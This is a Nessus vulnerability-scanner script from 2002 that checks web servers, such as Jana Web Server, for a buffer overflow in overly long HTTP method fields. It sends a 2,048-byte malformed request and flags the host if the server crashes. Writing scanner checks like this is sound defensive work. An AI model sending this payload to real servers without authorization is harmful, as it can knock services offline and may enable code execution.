#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# References:
# From:"Matthew Murphy" <mattmurphy@kc.rr.com>
# To:"BugTraq" <bugtraq@securityfocus.com>, 
#  "Vuln-Dev" <vuln-dev@securityfocus.com>, 
#  "SecurITeam News" <news@securiteam.com>,
#  "Full Disclosure" <full-disclosure@lists.netsys.com>
# Subject: Unchecked Buffer in Jana Web Server
# Date: Mon, 5 Aug 2002 17:38:45 -0500
#
# From: "Matthew Murphy" <mattmurphy@kc.rr.com>
# Subject: Multiple pServ Remote Buffer Overflow Vulnerabilities
# To: "BugTraq" <bugtraq@securityfocus.com>
# Date: Sun, 1 Dec 2002 12:15:52 -0600
#
# Date:  Fri, 26 Jul 2002 12:12:45 +0400
# From: "3APA3A" <3APA3A@SECURITY.NNOV.RU>
# To: bugtraq@securityfocus.com
# Subject: SECURITY.NNOV: multiple vulnerabilities in JanaServer
#
# Affected:
# JanaServer?
# 


if(description)
{
 script_id(11065);
 script_bugtraq_id(5319);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CAN-2002-1061");
 name["english"] = "HTTP method overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
sending an invalid request with a too long HTTP method field

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "too long HTTP method kills the web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencies("find_service.nes", "http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

########

include("http_func.inc");

r = string(crap(data:"HEADNESSUSNESSUS", length: 2048), " / HTTP/1.0\r\n\r\n");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

send(socket:soc, data: r);
r = http_recv(socket:soc);
http_close_socket(soc);

if (http_is_dead(port: port)) security_hole(port);
